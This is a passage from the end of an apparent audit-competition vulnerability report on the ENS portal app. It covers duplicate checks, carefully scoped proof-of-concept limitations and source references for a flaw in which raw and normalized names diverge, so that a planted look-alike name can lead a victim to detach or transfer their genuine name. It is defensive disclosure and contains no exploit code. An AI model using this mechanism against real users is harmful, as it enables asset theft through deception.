I went through the remaining entries looking for a closer match and did not find one. WEB-1257 and QA-01 concern role and registry state *after* a legitimate transfer, not which asset is transferred. WEB-1249 is about subname creation replacing a child registry. EXP-4337-003 is about the `from` field of an EOA request not being compared to the connected account — a different field, a different layer, and it does not involve name resolution at all.

### Search limitation, stated honestly

The audited repository has issues disabled and shows no pull requests, so there is no issue or review history in the competition repo to search. The upstream monorepo these apps are extracted from is private, so I could not check whether this was raised there. My duplicate analysis is therefore limited to the published known-issues list plus public prior art.

## Known limitations

I want to be precise about the line between what is executed and what is argued.

* **The route component was never rendered.** The PoC mounts `useTransferName` itself and asserts on what it emits, but it does not mount the transfer route or `SendNameForm` in a browser or a test renderer. The wiring from the route to the hook — the `isAddressEqual` gate, the toggle defaults, the enable condition — is quoted from source and reasoned about, not rendered. A reviewer who wants a rendered demonstration should follow the step-by-step scenario above.
* **The vitest registry state is declared; the fork run is what establishes it is reachable.** The in-memory transport asserts that the victim owns all three labels. That state is separately reproduced on the anvil fork, including the registration of the twin with `owner` set to the victim. The two artifacts are independent and should be read together.
* **The fork run does not drive the Explorer's UI.** It executes the reads `useTransferDetachTargets` performs and the write `detachNameResolver` would build, using the same ensjs functions the app calls, but it issues them from a script rather than from the mounted component. The link between "the hook would build this write" and "this write does that on chain" is that test 8 shows the hook emits it and the fork run shows the effect of sending it.
* **Wallet transaction-preview behaviour is untested.** I did not test what any specific wallet shows in its preview. If a wallet resolved the ERC-1155 id back to a name and displayed it, the victim would have a chance to notice. Two things make that unlikely rather than impossible: the id is the *versioned* id returned by `PermissionedRegistry.getTokenId(labelhash)`, not a labelhash, so there is no generic reverse mapping a wallet could apply; and the transaction's `to` is a leaf registry contract rather than a well-known NFT collection. The resolver-detach transaction that runs first is a bare `setResolver(uint256,address)` on the same registry, which no wallet decodes into a name at all. This is stated as an assumption, not a finding.
* **The owned-names listing path was reasoned about, not exercised end to end.** `mergeOwnedNames` and `filterAndSortOwnedNames` are real functions and `mergeOwnedNames` is executed in the PoC, but the list they operate on comes from the indexer, which is out of scope. I have not verified in a live Explorer that a planted name appears in the owned-names panel. The scenario deliberately also gives a direct-URL path that does not depend on that listing.
* **The final `safeTransferFrom` was never broadcast.** The fork run stops after the detach-resolver write. The token-transfer calldata is test 7, emitted by the real hook and carrying the genuine name's id, but I did not send it to the fork, so the on-chain movement of the genuine name is calldata-verified rather than executed. The fork does establish that the victim owns the genuine token; I did not separately read `ROLE_CAN_TRANSFER_ADMIN` for it there, which is the remaining on-chain condition for that last transaction to succeed.
* **The detach-registry leg was not exercised.** `detachNameRegistry` has the identical raw/normalized split, and the attacker can arm it by passing a subregistry to `register()`, but I only ran the resolver leg, so I claim only that one.
* **The theft variant was not demonstrated**, for the reason given above: it needs the victim to type the attacker's address, and I have no tested mechanism for that.
* **I have not enumerated every other consumer of `getLabel`** to say whether the same raw/normalized split causes trouble elsewhere. The claim in this report is scoped to the transfer flow, which is the one I executed.

## References

All paths are in `immunefi-team/audit-comp-ens` at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.

**The divergence itself:**

* `apps/portal/src/routes/$name/ownership/transfer.tsx` — `RouteComponent`; authorizes against the raw route parameter and passes the raw string down to the transfer form.
* `apps/portal/src/utils/ens/resolveEnsOwner.ts` — `resolveEnsOwner`; reads the owner of the literal string from the chain.
* `apps/portal/src/features/profile/hooks/useEnsOwner.ts` — `getEnsOwner`; hands the raw name to `resolveEnsOwner` unmodified.
* `apps/portal/src/utils/token/getLabel.ts` — `getLabel`; the divergent derivation, `ens_normalize` then `ens_split`.
* `apps/portal/src/features/transfer/hooks/useTransferName.ts` — holds the raw name and the normalized label in the same function body and hands both to every step.

**The writes:**

* `apps/portal/src/features/transfer/helpers/transferToken.ts` — `safeTransferFrom` with the normalized-label token id, described with the raw name.
* `apps/portal/src/features/transfer/helpers/detachNameResolver.ts` — `setResolver` keyed on the normalized label, described with the raw name.
* `apps/portal/src/features/transfer/helpers/detachNameRegistry.ts` — the identical split on `setSubregistry`.
* `apps/portal/src/features/transfer/utils/buildTransferPlan.ts` — detach steps ordered before the token transfer.

**The gates that pass on the wrong asset:**

* `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts` — resolver, registry and address reads on the raw name; role check on the normalized label.
* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts` — the transfer-role gate also runs on `getLabel(name)`.
* `apps/portal/src/routes/$name/ownership/index.tsx` — renders the Transfer button when both of the above pass.
* `apps/portal/src/features/transfer/components/SendNameForm.tsx` — detach toggles default to on.

**Discovery path and the unused guard:**

* `apps/portal/src/features/dashboard/utils/ownedNamesUtils.ts` — `mergeOwnedNames` dedups by lowercase; `filterAndSortOwnedNames` matches by substring.
* `apps/portal/src/utils/token/isNormalized.ts` — `isValidEnsName`, the guard that rejects the hostile string and that the transfer path never calls.

**Prior art, acknowledged for completeness:** `ensdomains/ens-app` issue **#1346**, "App handles showing non-normalised names poorly", and the surrounding homoglyph discussion, cover non-normalized names reaching the **legacy** ENS app. There the app crashed while trying to normalize a name the subgraph returned, and the request was to display the real name with a warning. Anyone searching this area will find it, so it is better that I name it. It is a different codebase, a different era, and a different mechanism: #1346 is about *rendering* a non-normalized name, whereas this is about a normalized and a non-normalized derivation of the same input being used for two different decisions inside one transaction flow. I mention it for completeness, not as a claim of novelty over it.
